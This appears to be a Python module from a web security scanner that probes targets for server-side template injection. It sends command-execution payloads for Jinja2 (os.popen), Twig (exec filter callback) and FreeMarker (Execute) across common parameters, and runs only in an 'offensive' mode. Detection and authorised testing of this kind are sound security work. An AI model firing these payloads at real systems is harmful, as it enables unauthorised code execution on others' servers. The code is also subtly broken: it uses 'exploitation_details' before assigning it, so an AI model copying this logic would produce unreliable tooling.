"""Server-Side Template Injection (SSTI) vulnerability scanner."""

import requests
import logging
import re
from typing import List, Optional
from urllib.parse import urljoin, quote

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.evidence_collector import EvidenceCollector

logger = logging.getLogger(__name__)


class TemplateInjectionScanner(BaseScanner):
    """Test for Server-Side Template Injection vulnerabilities."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.OFFENSIVE):
        """Initialize template injection scanner."""
        super().__init__(
            name="template_injection",
            command=None,  # Python-based
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Test for template injection vulnerabilities."""
        findings = []
        
        if not self.is_available():
            return findings
        
        # Only run in offensive mode
        if self.scan_mode == ScanMode.DEFENSIVE:
            return findings
        
        try:
            findings.extend(self._discover_template_endpoints(target.url))
            findings.extend(self._test_ssti_payloads(target.url))
            
        except Exception as e:
            logger.error(f"Template injection scanning failed: {e}", exc_info=True)
        
        return findings
    
    def _discover_template_endpoints(self, base_url: str) -> List[Finding]:
        """Discover template processing endpoints."""
        findings = []
        
        # Common template endpoints
        template_paths = [
            '/render',
            '/template',
            '/view',
            '/preview',
            '/email',
            '/report',
        ]
        
        for path in template_paths:
            try:
                test_url = urljoin(base_url, path)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code in [200, 400]:
                    findings.append(Finding(
                        title="Template Endpoint Detected",
                        description=f"Template endpoint found at {path}. Verify it's protected against SSTI.",
                        severity=FindingSeverity.INFO,
                        category=FindingCategory.FINGERPRINTING,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Ensure template engines sanitize user input and disable code execution.",
                    ))
            except:
                continue
        
        return findings
    
    def _test_ssti_payloads(self, base_url: str) -> List[Finding]:
        """Test for SSTI using various template engine payloads."""
        findings = []
        
        # SSTI payloads for different template engines
        ssti_payloads = {
            'jinja2': {
                'payloads': [
                    '{{7*7}}',
                    '{{config}}',
                    '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                ],
                'expected': ['49', 'config', 'uid=']
            },
            'twig': {
                'payloads': [
                    '{{7*7}}',
                    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                ],
                'expected': ['49', 'uid=']
            },
            'freemarker': {
                'payloads': [
                    '${7*7}',
                    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                ],
                'expected': ['49', 'uid=']
            },
            'velocity': {
                'payloads': [
                    '#set($x=7*7)$x',
                ],
                'expected': ['49']
            },
            'smarty': {
                'payloads': [
                    '{7*7}',
                    '{php}echo "test";{/php}',
                ],
                'expected': ['49', 'test']
            },
        }
        
        # Common parameter names for template injection
        params = ['template', 'view', 'page', 'name', 'file', 'path', 'content', 'data']
        
        # Track which parameters have been confirmed for which engines
        # Only report ONE engine per parameter - the first one that matches
        param_engine_map = {}  # param -> engine_name
        
        # Get baseline response for comparison
        try:
            baseline_response = self.session.get(base_url, timeout=5)
            baseline_content = baseline_response.text
        except:
            baseline_content = ""
        
        for param in params:
            # Skip if we already found an SSTI vulnerability for this parameter
            if param in param_engine_map:
                continue
                
            confirmed_engine = None
            code_execution_confirmed = False
            template_eval_confirmed = False
            matched_payload = None
            matched_response = None
            
            # Test each engine sequentially - stop at first match
            for engine_name, engine_data in ssti_payloads.items():
                if confirmed_engine:
                    break  # Already found an engine for this parameter
                
                for payload, expected in zip(engine_data['payloads'], engine_data['expected']):
                    try:
                        # Determine if this is a code execution payload or just expression evaluation
                        # Code execution requires actual command output indicators, not just expression evaluation
                        is_code_execution = ('uid=' in expected or 'whoami' in expected or 
                                           ('popen' in payload and 'uid=' in expected) or
                                           ('Execute' in payload and 'uid=' in expected))
                        # Note: Expression evaluation (like 7*7=49) is NOT code execution
                        
                        # For code execution payloads, we need stronger verification
                        # Single "uid=" match could be false positive - require multiple indicators
                        
                        # Test GET parameter
                        test_url = f"{base_url}?{param}={quote(payload)}"
                        response = self.session.get(test_url, timeout=5)
                        
                        # STRICT validation: Check if expected value appears in response
                        # AND it's not just coincidence (e.g., "49" appearing in normal content)
                        if expected in response.text:
                            # Additional validation: Check that response differs from baseline
                            # AND that the expected value appears in a context that suggests execution
                            content_differs = response.text != baseline_content
                            
                            # For mathematical expressions like "49", check it appears as isolated number
                            # or in context that suggests execution (not just part of a larger number)
                            if expected == '49':
                                # Check that "49" appears as its own number (not "149" or "490")
                                import re
                                # Look for 49 as standalone number (word boundaries or whitespace)
                                if re.search(r'\b49\b', response.text):
                                    if content_differs or is_code_execution:
                                        if is_code_execution:
                                            code_execution_confirmed = True
                                        else:
                                            template_eval_confirmed = True
                                        confirmed_engine = engine_name
                                        matched_payload = payload
                                        matched_response = response.text[:500]  # Store sample
                                        break
                            else:
                                # For other expected values (like config dumps, command output)
                                # For code execution, prefer MULTIPLE indicators but allow single with baseline check
                                if is_code_execution and expected == 'uid=':
                                    # Check for multiple command output patterns (not just single "uid=")
                                    uid_pattern = 'uid=' in response.text
                                    gid_pattern = 'gid=' in response.text
                                    groups_pattern = 'groups=' in response.text
                                    
                                    # Check baseline for these patterns
                                    baseline_uid = 'uid=' in baseline_content if baseline_content else False
                                    baseline_gid = 'gid=' in baseline_content if baseline_content else False
                                    baseline_groups = 'groups=' in baseline_content if baseline_content else False
                                    
                                    pattern_count = sum([uid_pattern, gid_pattern, groups_pattern])
                                    
                                    # Strong verification: 2+ patterns and not in baseline
                                    if pattern_count >= 2:
                                        if not (baseline_uid and baseline_gid) or (content_differs or not baseline_content):
                                            code_execution_confirmed = True
                                            confirmed_engine = engine_name
                                            matched_payload = payload
                                            matched_response = response.text[:500]
                                            break
                                    # Fallback: Single pattern if NOT in baseline (could be real, just less certain)
                                    elif pattern_count == 1 and uid_pattern and not baseline_uid:
                                        # Single uid= pattern, but not in baseline - report as POTENTIAL
                                        code_execution_confirmed = True
                                        confirmed_engine = engine_name
                                        matched_payload = payload
                                        matched_response = response.text[:500]
                                        # Add note about verification level
                                        if 'verification_note' not in exploitation_details:
                                            exploitation_details['verification_note'] = 'Single pattern (uid=) detected - not in baseline. Manual verification recommended.'
                                        break
                                elif content_differs or is_code_execution:
                                    # For non-code-execution or when we already verified code execution
                                    if is_code_execution:
                                        code_execution_confirmed = True
                                    else:
                                        template_eval_confirmed = True
                                    confirmed_engine = engine_name
                                    matched_payload = payload
                                    matched_response = response.text[:500]
                                    break
                        
                        # Test POST parameter only if GET didn't work
                        if not confirmed_engine:
                            test_data = {param: payload}
                            post_response = self.session.post(base_url, data=test_data, timeout=5)
                            
                            if expected in post_response.text:
                                if expected == '49' and re.search(r'\b49\b', post_response.text):
                                    if post_response.text != baseline_content or is_code_execution:
                                        if is_code_execution:
                                            code_execution_confirmed = True
                                        else:
                                            template_eval_confirmed = True
                                        confirmed_engine = engine_name
                                        matched_payload = payload
                                        matched_response = post_response.text[:500]
                                        break
                                elif expected != '49':
                                    if post_response.text != baseline_content or is_code_execution:
                                        if is_code_execution:
                                            code_execution_confirmed = True
                                        else:
                                            template_eval_confirmed = True
                                        confirmed_engine = engine_name
                                        matched_payload = payload
                                        matched_response = post_response.text[:500]
                                        break
                                
                    except Exception as e:
                        logger.debug(f"SSTI test error for {engine_name}/{param}: {e}")
                        continue
                
                if confirmed_engine:
                    break  # Found matching engine, stop testing others
            
            # Report finding ONLY if we have STRONG evidence
            # For code execution: require actual command output (uid=, whoami, etc.), not just expression evaluation
            # For expression evaluation: only report as LOW/INFO, not as vulnerability
            if confirmed_engine and code_execution_confirmed:
                # Only report if we have ACTUAL code execution proof (command output, not just math)
                # Build full test URL
                full_test_url = f"{base_url}?{param}={quote(matched_payload)}" if matched_payload else base_url
                
                # Extract relevant response snippet (context around the matched output)
                response_snippet = ""
                matched_output = ""
                if matched_response:
                    # Try to find the expected output in context (look for command output indicators)
                    for expected_val in ssti_payloads[confirmed_engine]['expected']:
                        if expected_val in matched_response and expected_val != '49':  # Skip math expressions
                            matched_output = expected_val
                            idx = matched_response.find(expected_val)
                            start = max(0, idx - 100)
                            end = min(len(matched_response), idx + len(expected_val) + 100)
                            response_snippet = matched_response[start:end]
                            break
                    
                    if not response_snippet and matched_response:
                        response_snippet = matched_response[:300]  # Fallback to first 300 chars
                
                evidence = f"Request URL: {full_test_url}\nPayload: {matched_payload}\nResponse contains command execution output: {matched_output if matched_output else 'see response snippet'}\nResponse snippet: {response_snippet[:200]}..."
                
                # Adjust title/severity based on verification confidence
                verification_note = exploitation_details.get('verification_note', '')
                
                # Build exploitation_details string (keep dict for verification_note check above)
                exploitation_details_str = f"Code execution confirmed in {confirmed_engine} template engine. Parameter '{param}' accepts payload '{matched_payload}' and executes it as template code. Command output was observed in response."
                if verification_note:
                    exploitation_details_str += f" Note: {verification_note}"
                if verification_note and 'Single pattern' in verification_note:
                    title = f"SSTI - Code Execution ({confirmed_engine}) [REQUIRES VERIFICATION]"
                    description = (f"Parameter '{param}' executes user input as template code in {confirmed_engine} template engine. "
                                  f"Command output pattern detected (single pattern, not in baseline). "
                                  f"{verification_note} Code execution likely but not fully verified.")
                    severity = FindingSeverity.HIGH  # HIGH instead of CRITICAL for less certain
                else:
                    title = f"SSTI - Code Execution ({confirmed_engine})"
                    description = (f"Parameter '{param}' executes user input as template code in {confirmed_engine} template engine. "
                                  f"Code execution confirmed through observed command output in response (multiple indicators).")
                    severity = FindingSeverity.CRITICAL
                
                findings.append(Finding(
                    title=title,
                    description=description,
                    severity=severity,
                    category=FindingCategory.VULNERABILITY,
                    source_scanner=self.name,
                    url=full_test_url,
                    evidence=evidence,
                    remediation=f"Sanitize user input for parameter '{param}'. Use safe template rendering methods that do not execute user input as code. Disable code execution capabilities in template engine configuration.",
                    references=["https://owasp.org/www-community/attacks/Server_Side_Template_Injection"],
                    exploited=True,
                    exploitation_details=exploitation_details_str,
                    metadata={
                        'engine': confirmed_engine,
                        'parameter': param,
                        'code_execution': True,
                        'payload': matched_payload,
                        'test_url': full_test_url,
                        'verification_note': verification_note,
                    }
                ))
            elif confirmed_engine and template_eval_confirmed and matched_payload and '49' in str(matched_payload):
                # Expression evaluation (like 7*7=49) - this is LOW/INFO severity, NOT a vulnerability
                # It's just proof that expressions are evaluated, not code execution
                full_test_url = f"{base_url}?{param}={quote(matched_payload)}"
                
                # Find where "49" appears in response
                response_snippet = ""
                if matched_response:
                    idx = matched_response.find('49')
                    if idx >= 0:
                        start = max(0, idx - 50)
                        end = min(len(matched_response), idx + 10)
                        response_snippet = matched_response[start:end]
                
                evidence = f"Request URL: {full_test_url}\nPayload: {matched_payload}\nResponse contains evaluated result: 49\nResponse context: {response_snippet}"
                exploitation_details = f"Template expression evaluation detected. Parameter '{param}' processes payload '{matched_payload}' and evaluates it (result: 49). This indicates user input is processed as template expressions. Note: This is expression evaluation only, not confirmed code execution."
                
                findings.append(Finding(
                    title=f"Template Expression Evaluation Detected ({confirmed_engine})",
                    description=f"Parameter '{param}' appears to evaluate template expressions in {confirmed_engine} template engine. Mathematical expression was evaluated (7*7=49). This indicates template processing but does not confirm code execution capability. Manual verification recommended.",
                    severity=FindingSeverity.INFO,  # INFO severity - expression eval is not a vulnerability by itself
                    category=FindingCategory.INFORMATION_DISCLOSURE,  # Not a vulnerability category
                    source_scanner=self.name,
                    url=full_test_url,
                    evidence=evidence,
                    remediation=f"Review parameter '{param}' usage. If template functionality is intended, ensure proper input sanitization and access controls. If not, disable template processing for user input.",
                    references=["https://owasp.org/www-community/attacks/Server_Side_Template_Injection"],
                    exploited=False,
                    exploitation_details=exploitation_details,
                    metadata={
                        'engine': confirmed_engine,
                        'parameter': param,
                        'code_execution': False,
                        'expression_evaluation': True,
                        'payload': matched_payload,
                        'test_url': full_test_url,
                        'note': 'Expression evaluation only - not confirmed code execution'
                    }
                ))
        
        return findings
    
    def is_available(self) -> bool:
        """Template injection scanner is always available."""
        return True

